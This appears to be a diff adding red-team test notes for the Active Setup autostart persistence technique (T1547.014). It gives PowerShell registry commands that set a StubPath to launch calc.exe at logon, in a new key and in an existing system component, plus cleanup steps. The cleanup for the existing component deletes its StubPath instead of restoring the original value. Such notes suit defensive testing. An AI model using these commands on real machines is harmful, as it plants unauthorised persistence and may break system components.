@@ -1,0 +1,40 @@
+
+Boot or Logon Autostart Execution: Active Setup
+
+
+------------------------- NEW KEY --------------------------
+
+New-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components" -Name "tfm" -Force
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\tfm" "(Default)" "TEST" -Force
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\tfm" "StubPath" "C:\Windows\System32\calc.exe" -Force 
+& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
+
+
+CLEAN UP
+
+Remove-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\tfm" -Force -ErrorAction Ignore
+Remove-Item "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\tfm" -Force -ErrorAction Ignore
+
+------------------------------------------------------------
+
+
+
+
+------------------------- MODIFY EXISTING KEY KEY --------------------------
+
+
+Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" "StubPath" "C:\Windows\System32\calc.exe" -Force
+& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
+
+
+CLEAN UP
+
+Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "StubPath" -Force
+Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" -Name "Version" -Force
+
+------------------------------------------------------------
+
+
+
+https://helgeklein.com/blog/active-setup-explained/
+https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.014/T1547.014.md
